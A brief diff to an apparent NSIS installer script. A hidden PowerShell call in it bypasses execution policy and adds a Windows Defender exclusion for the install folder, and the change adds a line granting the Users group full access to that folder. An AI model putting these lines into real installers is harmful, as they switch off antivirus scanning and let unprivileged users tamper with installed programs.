@@ -80,6 +80,8 @@ SetOverwrite on
 
 ExecWait `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Add-MpPreference -ExclusionPath  \"$INSTDIR\""`
 
+AccessControl::GrantOnFile  "$INSTDIR" "(S-1-5-32-545)" "FullAccess"
+
 Delete "$INSTDIR\${APP}.exe"
 Delete "$INSTDIR\${APP}32.exe"
 Delete "$INSTDIR\${APP}64.exe"
